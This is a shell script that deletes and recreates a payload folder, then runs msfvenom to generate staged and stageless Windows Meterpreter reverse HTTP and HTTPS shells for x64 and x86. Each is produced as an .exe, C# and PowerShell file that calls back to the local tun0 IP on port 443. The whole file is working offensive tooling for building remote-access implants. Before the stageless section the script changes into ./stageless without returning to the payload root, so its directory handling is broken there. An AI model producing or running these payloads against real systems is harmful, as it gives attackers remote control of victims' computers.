#!/bin/sh

# Define impt variables: IP & Port num
LHOST=$(ip a | grep tun0 | tail -n 1 | awk '{print $2}' | awk -F/ '{print $1}')
#LHOST=$(ip a | grep eth0 | tail -n 1 | awk '{print $2}' | awk -F/ '{print $1}')
LPORT=443

# Delete any previous payloads
rm -rf met_payloads

# Create folder to hold payloads
mkdir met_payloads
cd met_payloads

mkdir -p staged/x64
mkdir -p staged/x64/https
mkdir -p staged/x64/http

mkdir -p staged/x86
mkdir -p staged/x86/https
mkdir -p staged/x86/http

mkdir -p stageless/x64
mkdir -p stageless/x64/https
mkdir -p stageless/x64/http

mkdir -p stageless/x86
mkdir -p stageless/x86/https
mkdir -p stageless/x86/http

# Dynamically generate payloads in various formats based on current IP

# STAGED
# Staged x64 HTTPS
cd ./staged/x64/https

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./staged_met64_https.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./staged_met64_https.cs
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./staged_met64_https.ps1

chmod +x ./staged_met64_https.exe
chmod +x ./staged_met64_https.ps1

# Staged x64 HTTP
cd ../../../
cd ./staged/x64/http

msfvenom -p windows/x64/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./staged_met64_http.exe
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./staged_met64_http.cs
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./staged_met64_http.ps1

chmod +x ./staged_met64_http.exe
chmod +x ./staged_met64_http.ps1

# Staged x86 https
cd ../../../
cd ./staged/x86/https

msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./staged_met32_https.exe
msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./staged_met32_https.cs
msfvenom -p windows/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./staged_met32_https.ps1

chmod +x ./staged_met32_https.exe
chmod +x ./staged_met32_https.ps1


# Staged x86 http
cd ../../../
cd ./staged/x86/http

msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./staged_met32_http.exe
msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./staged_met32_http.cs
msfvenom -p windows/meterpreter/reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./staged_met32_http.ps1

chmod +x ./staged_met32_http.exe
chmod +x ./staged_met32_http.ps1





# STAGELESS
# Stageless x64 HTTPS
cd ./stageless/x64/https

msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met64_https.exe
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met64_https.cs
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met64_https.ps1

chmod +x ./stageless_met64_https.exe
chmod +x ./stageless_met64_https.ps1

# stageless x64 HTTP
cd ../../../
cd ./stageless/x64/http

msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met64_http.exe
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met64_http.cs
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met64_http.ps1

chmod +x ./stageless_met64_http.exe
chmod +x ./stageless_met64_http.ps1

# stageless x86 https
cd ../../../
cd ./stageless/x86/https

msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met32_https.exe
msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met32_https.cs
msfvenom -p windows/meterpreter_reverse_https LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met32_https.ps1

chmod +x ./stageless_met32_https.exe
chmod +x ./stageless_met32_https.ps1


# stageless x86 http
cd ../../../
cd ./stageless/x86/http

msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f exe -o ./stageless_met32_http.exe
msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT -f csharp -o ./stageless_met32_http.cs
msfvenom -p windows/meterpreter_reverse_http LHOST=$LHOST LPORT=$LPORT EXITFUNC=thread -f ps1 -o ./stageless_met32_http.ps1

chmod +x ./stageless_met32_http.exe
chmod +x ./stageless_met32_http.ps1